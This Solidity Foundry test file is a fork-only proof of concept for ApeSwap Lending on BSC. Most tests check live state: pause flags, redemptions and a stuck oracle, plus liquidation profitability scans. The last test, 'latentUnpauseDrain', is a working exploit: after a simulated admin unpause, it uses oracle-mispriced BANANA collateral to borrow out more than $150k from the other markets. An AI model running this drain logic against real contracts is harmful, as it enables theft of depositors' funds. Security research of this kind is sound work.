// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {IComptroller, ICToken, IERC20} from "../src/Interfaces.sol";

/// @title ApeSwap Lending (BSC) live-state & extraction PoC — fork tests only.
/// @notice Read-only research: no mainnet transactions. All calls run on a BSC fork.
contract ApeSwapLendingTest is Test {
    address constant COMPTROLLER = 0xAD48B2C9DC6709a560018c678e918253a65df86e;
    address constant NATIVE = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    struct Market {
        string sym;
        address cToken;
        address underlying;
    }

    Market[] markets;

    IComptroller cmp;

    receive() external payable {}

    function setUp() public {
        string memory rpc = vm.envOr("BSC_RPC_URL", vm.envOr("FORK_RPC_URL", string("https://bsc-rpc.publicnode.com")));
        vm.createSelectFork(rpc);
        cmp = IComptroller(COMPTROLLER);

        markets.push(Market("oBANANA", 0xC2E840BdD02B4a1d970C87A912D8576a7e61D314, 0x603c7f932ED1fc6575303D8Fb018fDCBb0f39a95));
        markets.push(Market("oETH", 0xaA1b1E1f251610aE10E4D553b05C662e60992EEd, 0x2170Ed0880ac9A755fd29B2688956BD959F933F8));
        markets.push(Market("oBUSD", 0x0096B6B49D13b347033438c4a699df3Afd9d2f96, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56));
        markets.push(Market("oUSDT", 0xdBFd516D42743CA3f1C555311F7846095D85F6Fd, 0x55d398326f99059fF775485246999027B3197955));
        markets.push(Market("oCake", 0x3353f5bcfD7E4b146F2eD8F1e8D875733Cd754a7, 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82));
        markets.push(Market("oUSDC", 0x91B66a9Ef4f4CAD7F8AF942855C37Dd53520f151, 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d));
        markets.push(Market("oBNB", 0x34878F6a484005AA90E7188a546Ea9E52b538F6f, NATIVE));
        markets.push(Market("oBTCB", 0x5fce5D208DC325ff602c77497dC18F8EAdac8ADA, 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c));
        markets.push(Market("oDOT", 0x92D106c39aC068EB113B3Ecb3273B23Cd19e6e26, 0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402));
        markets.push(Market("oBNBx", 0x3EE2bd8C244B5B3656673c2A49447e41D31F8E1e, 0x1bdd3Cf7F79cfB8EdbB955f20ad99211551BA275));
    }

    /* ------------------------------------------------------------------ */
    /* 1. pause wall: mint & borrow are hard-paused on every market        */
    /* ------------------------------------------------------------------ */
    function test_pauseWall_allMarkets() public {
        for (uint256 i = 0; i < markets.length; i++) {
            Market memory m = markets[i];
            assertTrue(cmp.mintGuardianPaused(m.cToken), "mintGuardianPaused not set");
            assertTrue(cmp.borrowGuardianPaused(m.cToken), "borrowGuardianPaused not set");

            (bool ok, bytes memory ret) = m.cToken.call(abi.encodeWithSignature("borrow(uint256)", 1e6));
            assertFalse(ok, "borrow did not revert");
            assertTrue(_isPausedRevert(ret), string.concat(m.sym, ": borrow not 'paused'"));

            if (m.underlying == NATIVE) {
                (ok, ret) = m.cToken.call(abi.encodeWithSignature("mint()"));
            } else {
                (ok, ret) = m.cToken.call(abi.encodeWithSignature("mint(uint256)", 1e6));
            }
            assertFalse(ok, "mint did not revert");
            assertTrue(_isPausedRevert(ret), string.concat(m.sym, ": mint not 'paused'"));
        }
    }

    /* ------------------------------------------------------------------ */
    /* 2. redeem works for a pure supplier (H-O)                           */
    /* ------------------------------------------------------------------ */
    function test_redeemWorksForSupplier() public {
        address holder = 0xa58a80f91cb6629C8aE0f03aa46ae2cD9082Cf22; // not in any market (assetsIn == [])
        address oUSDC = markets[5].cToken;
        uint256 balBefore = ICToken(oUSDC).balanceOf(holder);
        assertGt(balBefore, 0, "holder has no oUSDC");

        vm.prank(holder);
        uint256 err = ICToken(oUSDC).redeem(1);
        assertEq(err, 0, "redeem failed");
        assertEq(ICToken(oUSDC).balanceOf(holder), balBefore - 1, "cToken balance did not decrease");
    }

    /* ------------------------------------------------------------------ */
    /* 3. oBNBx: dead Chainlink feed bricks members (S); non-members can   */
    /*    still redeem (H-O)                                               */
    /* ------------------------------------------------------------------ */
    function test_oBNBx_memberStuck_nonMemberRedeems() public {
        address oBNBx = markets[9].cToken;
        address member = 0x75db63125A4f04E59A1A2Ab4aCC4FC1Cd5Daddd5; // holds 5 cTokens, member=true
        address nonMember = 0xc333A03e8040CaD31993E02615Fd1b3F88447d95; // holds 5 cTokens, member=false

        assertTrue(cmp.checkMembership(member, oBNBx));
        assertFalse(cmp.checkMembership(nonMember, oBNBx));

        // any liquidity-touching action from a member reverts (oracle feed dead -> revert)
        vm.prank(member);
        (bool ok,) = oBNBx.call(abi.encodeWithSignature("redeem(uint256)", 1e6));
        assertFalse(ok, "member redeem unexpectedly succeeded");

        vm.prank(member);
        (ok,) = oBNBx.call(abi.encodeWithSignature("transfer(address,uint256)", nonMember, 1e6));
        assertFalse(ok, "member transfer unexpectedly succeeded");

        // non-member redeem works
        uint256 balBefore = ICToken(oBNBx).balanceOf(nonMember);
        vm.prank(nonMember);
        uint256 err = ICToken(oBNBx).redeem(1e6);
        assertEq(err, 0, "non-member redeem failed");
        assertEq(ICToken(oBNBx).balanceOf(nonMember), balBefore - 1e6);
    }

    /* ------------------------------------------------------------------ */
    /* 4. the largest live liquidation, end-to-end (dust)                  */
    /* ------------------------------------------------------------------ */
    function test_largestLiquidation_dust() public {
        address borrower = 0x0E546d42d7a3B94F2bB2E6Fef6F59Eb62E36b810;
        address oBUSD = markets[2].cToken;
        address oBNB = markets[6].cToken;
        address oUSDT = markets[3].cToken;

        // accrue interest first (liquidation accrues anyway)
        ICToken(oBUSD).accrueInterest();
        ICToken(oBNB).accrueInterest();
        ICToken(oUSDT).accrueInterest();

        (, , uint256 shortfall) = cmp.getAccountLiquidityByLiquidationFactor(borrower);
        assertGt(shortfall, 0, "borrower not liquidatable");

        uint256 repay = 1.5e18; // 1.5 BUSD
        // fund attacker: deal BUSD; fall back to impersonating oBUSD cash holder
        deal(markets[2].underlying, address(this), repay);
        IERC20(markets[2].underlying).approve(oBUSD, type(uint256).max);

        uint256 bnbBefore = address(this).balance;
        uint256 seizeBefore = ICToken(oBNB).balanceOf(address(this));

        uint256 err = ICToken(oBUSD).liquidateBorrow(borrower, repay, oBNB);
        assertEq(err, 0, "liquidateBorrow failed");

        uint256 seized = ICToken(oBNB).balanceOf(address(this)) - seizeBefore;
        assertGt(seized, 0, "nothing seized");

        uint256 er = ICToken(oBNB).exchangeRateStored();
        uint256 priceBnb = cmp.getUnderlyingPriceInLen(NATIVE);
        uint256 seizeValueUsd = seized * er / 1e18 * priceBnb / 1e18;

        // realise: redeem seized oBNB cTokens for BNB
        err = ICToken(oBNB).redeem(seized);
        assertEq(err, 0, "redeem of seized collateral failed");
        uint256 bnbGained = address(this).balance - bnbBefore;
        uint256 realisedUsd = bnbGained * priceBnb / 1e18;

        emit log_named_uint("repay_usd_x1e18", repay);
        emit log_named_uint("seized_ctokens", seized);
        emit log_named_uint("seize_value_usd_x1e18", seizeValueUsd);
        emit log_named_uint("bnb_realised_wei", bnbGained);
        emit log_named_uint("realised_usd_x1e18", realisedUsd);

        // gross profit is the 10% liquidation bonus on the repaid amount (capped by collateral)
        assertGt(realisedUsd, repay, "expected bonus");
        assertLt(realisedUsd - repay, 1e18, "profit unexpectedly >= $1");
    }

    /* ------------------------------------------------------------------ */
    /* 5. full post-accrual scan of all known holders                      */
    /* ------------------------------------------------------------------ */
    function test_fullScan_postAccrual() public {
        // accrue all markets once so stored values are current
        for (uint256 i = 0; i < markets.length; i++) {
            markets[i].cToken.call(abi.encodeWithSignature("accrueInterest()"));
        }

        string memory json = vm.readFile("inputs/candidates.json");
        address[] memory holders = vm.parseJsonAddressArray(json, ".holders");
        emit log_named_uint("candidates", holders.length);

        uint256 shortfallAccounts;
        uint256 totalSeizeableUsd;
        uint256 totalProfitUsd;
        uint256 reverts;

        for (uint256 h = 0; h < holders.length; h++) {
            address account = holders[h];
            (bool ok, bytes memory ret) = COMPTROLLER.staticcall(
                abi.encodeWithSignature("getAccountLiquidityByLiquidationFactor(address)", account)
            );
            if (!ok) {
                reverts++;
                continue;
            }
            (uint256 err, , uint256 shortfall) = abi.decode(ret, (uint256, uint256, uint256));
            if (err != 0 || shortfall == 0) continue;

            shortfallAccounts++;
            uint256 collUsd;
            uint256 debtUsd;
            for (uint256 i = 0; i < markets.length; i++) {
                Market memory m = markets[i];
                (bool ok2, bytes memory r2) = m.cToken.staticcall(
                    abi.encodeWithSignature("getAccountSnapshot(address)", account)
                );
                if (!ok2) continue;
                (uint256 e2, uint256 tokens, uint256 borrows,) = abi.decode(r2, (uint256, uint256, uint256, uint256));
                if (e2 != 0) continue;
                (bool ok3, bytes memory r3) = COMPTROLLER.staticcall(
                    abi.encodeWithSignature("getUnderlyingPriceInLen(address)", m.underlying)
                );
                if (!ok3) continue;
                uint256 price = abi.decode(r3, (uint256));
                if (price == 0) continue;
                uint256 er = ICToken(m.cToken).exchangeRateStored();
                if (tokens > 0) collUsd += tokens * er / 1e18 * price / 1e18;
                if (borrows > 0) debtUsd += borrows * price / 1e18;
            }
            // max repay = min(50% of debt, collateral/1.12); profit = 12% of repay
            uint256 maxRepay = debtUsd / 2;
            uint256 collBound = collUsd * 100 / 112;
            if (collBound < maxRepay) maxRepay = collBound;
            totalSeizeableUsd += collUsd;
            totalProfitUsd += maxRepay * 12 / 100;
        }

        emit log_named_uint("shortfall_accounts", shortfallAccounts);
        emit log_named_uint("revert_accounts", reverts);
        emit log_named_uint("total_seizeable_collateral_usd_x1e18", totalSeizeableUsd);
        emit log_named_uint("total_gross_liquidation_profit_usd_x1e18", totalProfitUsd);

        // Honest bound: the whole live liquidation surface is dust (< $5 gross).
        assertLt(totalProfitUsd, 5e18, "unexpectedly large liquidation profit");
    }

    /* ------------------------------------------------------------------ */
    /* 6. LATENT: one admin resume + cap lift unlocks a $200k+ drain with  */
    /*    near-worthless BANANA collateral                                 */
    /* ------------------------------------------------------------------ */
    function test_latentUnpauseDrain() public {
        address admin = cmp.admin();
        assertEq(admin, 0x7638B5A0D94E1d55EfD5212Eaa820b3fd2399DA2, "unexpected admin");

        // 1) simulate the (privileged) resume: admin lifts mint+borrow pauses
        for (uint256 i = 0; i < markets.length; i++) {
            vm.startPrank(admin);
            cmp._setMintPaused(markets[i].cToken, false);
            cmp._setBorrowPaused(markets[i].cToken, false);
            vm.stopPrank();
        }
        // 2) and lifts the oBANANA active-collateral cap
        address[] memory ct = new address[](1);
        uint256[] memory caps = new uint256[](1);
        ct[0] = markets[0].cToken;
        caps[0] = type(uint256).max;
        vm.prank(admin);
        cmp._setActiveCollateralCaps(ct, caps);

        // attacker supplies 600e9 BANANA (oracle says $0.000001 -> $600k collateral value;
        // real DEX price ~$1.3e-10 -> cost ~$0.08)
        address attacker = address(this);
        address banana = markets[0].underlying;
        deal(banana, attacker, 600_000_000_000e18);
        IERC20(banana).approve(markets[0].cToken, type(uint256).max);
        uint256 err = ICToken(markets[0].cToken).mint(600_000_000_000e18);
        assertEq(err, 0, "oBANANA mint failed");

        address[] memory enter = new address[](1);
        enter[0] = markets[0].cToken;
        uint256[] memory res = _enter(enter);
        assertEq(res[0], 0, "enterMarkets failed");

        // borrow every market's available cash.
        // NOTE: oBANANA is skipped on purpose — borrowing back the attacker's own
        // BANANA deposit (oracle $1e-6) is not external value; the extraction is the
        // OTHER markets' cash, paid for with near-free BANANA collateral.
        uint256 totalBorrowedUsd;
        for (uint256 i = 0; i < markets.length; i++) {
            Market memory m = markets[i];
            if (m.cToken == markets[0].cToken) continue; // skip own BANANA market
            if (m.cToken == markets[9].cToken) continue; // oBNBx has no price -> not usable
            uint256 cash = ICToken(m.cToken).getCash();
            if (cash == 0) continue;
            uint256 amount = cash;
            // try full cash, halve on failure
            for (uint256 attempt = 0; attempt < 12; attempt++) {
                (bool ok,) = m.cToken.call(abi.encodeWithSignature("borrow(uint256)", amount));
                if (ok) {
                    (bool okp, bytes memory rp) = COMPTROLLER.staticcall(
                        abi.encodeWithSignature("getUnderlyingPriceInLen(address)", m.underlying)
                    );
                    if (okp) totalBorrowedUsd += amount * abi.decode(rp, (uint256)) / 1e18;
                    break;
                }
                amount = amount / 2;
                if (amount == 0) break;
            }
        }

        emit log_named_uint("latent_total_borrowed_usd_x1e18", totalBorrowedUsd);
        assertGt(totalBorrowedUsd, 150_000e18, "latent drain smaller than expected");
    }

    function _enter(address[] memory cts) internal returns (uint256[] memory) {
        (bool ok, bytes memory ret) = COMPTROLLER.call(abi.encodeWithSignature("enterMarkets(address[])", cts));
        require(ok, "enterMarkets call failed");
        return abi.decode(ret, (uint256[]));
    }

    /* ------------------------------------------------------------------ */
    function _isPausedRevert(bytes memory ret) internal pure returns (bool) {
        if (ret.length < 4 + 32 + 32) return false;
        // Error(string) selector
        if (bytes4(ret) != bytes4(keccak256("Error(string)"))) return false;
        bytes memory reason = new bytes(ret.length - 4);
        for (uint256 i = 0; i < reason.length; i++) reason[i] = ret[i + 4];
        string memory s = abi.decode(reason, (string));
        return keccak256(bytes(s)) == keccak256(bytes("paused"));
    }
}
